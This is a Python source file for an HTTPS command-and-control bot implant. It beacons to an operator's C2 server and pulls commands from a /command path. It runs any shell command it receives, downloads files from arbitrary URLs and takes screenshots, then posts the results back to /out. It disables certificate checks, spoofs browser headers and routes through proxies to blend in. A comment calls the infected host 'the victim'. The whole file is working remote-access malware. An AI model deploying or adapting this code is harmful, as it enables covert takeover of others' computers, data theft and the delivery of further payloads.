#https_bot v0.8
import requests
import logging
import subprocess
import time
import uuid
from optparse import OptionParser
import pyscreenshot as ImageGrab

botID = []

# Select your headers
# User-Agents to use
#'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36'
#'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'
#'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'
headers = {
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Encoding': 'gzip, deflate, sdch', 
  'Accept-Language': 'en-US,en;q=0.8', 
  'User-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36'
}


def genID(string_length=8):
  random = str(uuid.uuid4())
  random = random.upper()
  botID.append(random[0:string_length])

def beacon(host, seconds, proxies):
  time.sleep(int(seconds))
  try:
    fetch, content = request(host, proxies)
    if str(fetch) == "<Response [200]>":
      output = parse(content, proxies)
      send(host, content, output, proxies)
  except:
    return 0

def send(host, content, output, proxies):
  output = botID[0]+', '+content+', '+output
  if proxies is not None:
    response = requests.post('https://'+host+'/out', data=output, verify=False, proxies=proxies, headers = headers)
    return response     
  else:
    response = requests.post('https://'+host+'/out', data=output, verify=False, headers = headers)
    return response 

def request(host, proxies):
  if proxies is not None:
    response = requests.get('https://'+host+'/command', verify=False, proxies=proxies, headers = headers)
    return response, response.text
  else:
    response = requests.get('https://'+host+'/command', verify=False, headers = headers)
    return response, response.text

def request_certs(host, pcert, key):
  response = requests.get('https://'+host, verify=False, cert=(pcert, key), headers = headers)
  return response

def parse(response, proxies):
  commands = response.split()
  if commands[0] == "execute":
    ex = ' '.join(commands[1:])
    return execute(ex)
  if commands[0] == "sleep":
    time.sleep(int(commands[1]))
    return "slept for "+str(commands[1])+'\n'
  if commands[0] == "download":
    return "saved to "+str(download(commands[1], proxies))+'\n'
  if commands[0] == "screenshot":
    ImageGrab.grab_to_file(commands[1]+".png")
    return "saved to "+str(commands[1])+'.png\n'
  else: return 0

def execute(command):
  proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  stdoutput = proc.stdout.read() + proc.stderr.read()
  return stdoutput

def download(url, proxies):
  local_filename = url.split('/')[-1]
  if proxies is not None:
    r = requests.get(url, stream=True, verify=False, proxies=proxies, headers = headers)
  else:
    r = requests.get(url, stream=True, verify=False, headers = headers)
  with open(local_filename, 'wb') as f:
    for chunk in r.iter_content(chunk_size=1024): 
      if chunk:
        f.write(chunk)
        f.flush()
  return local_filename

def main():
  # Setup the command line arguments.
  optp = OptionParser()

  # Output verbosity options
  optp.add_option('-q', '--quiet', help='set logging to ERROR',
                  action='store_const', dest='loglevel',
                  const=logging.ERROR, default=logging.INFO)
  optp.add_option('-d', '--debug', help='set logging to DEBUG',
                  action='store_const', dest='loglevel',
                  const=logging.DEBUG, default=logging.INFO)
  optp.add_option('-v', '--verbose', help='set logging to COMM',
                  action='store_const', dest='loglevel',
                  const=5, default=logging.INFO)

  # Option to query a specific server
  optp.add_option("-s", "--server", dest="server",
                  help="HTTPS server to query <127.0.0.1>")
  # Option to use client certificates
  optp.add_option("-c", "--cert", dest="cert",
                  help="public certificate")
  # Option to use client certificates
  optp.add_option("-k", "--key", dest="key",
                  help="certificate key")
  # How often should the victim beacon
  optp.add_option("-b", "--beacon", dest="beacon",
                  help="sleep between beacons in seconds <10>")
  # Which proxy to use
  optp.add_option("-p", "--proxy", dest="proxy",
                  help="proxy server address, credentials and port <https://localhost:8080>")

  opts, args = optp.parse_args()

  #Prep proxy support
  if opts.proxy is None:
    proxies = None
  else:
    proxies = {
      "https": opts.proxy,
    }

  # Setup logging.
  logging.basicConfig(level=opts.loglevel,
                      format='%(levelname)-8s %(message)s')

  if opts.server is None:
    opts.server = raw_input("C2 server: ")

  if opts.beacon is None:
    opts.beacon = raw_input("How often should it beacon to C2 server: ")

  # Generate the botID
  genID()

  # Main Event Loop:
  try:
    while 1:
      beacon(opts.server, opts.beacon, proxies)

  except (KeyboardInterrupt, EOFError) as e:
    exit(0)


if __name__ == '__main__':
  main()
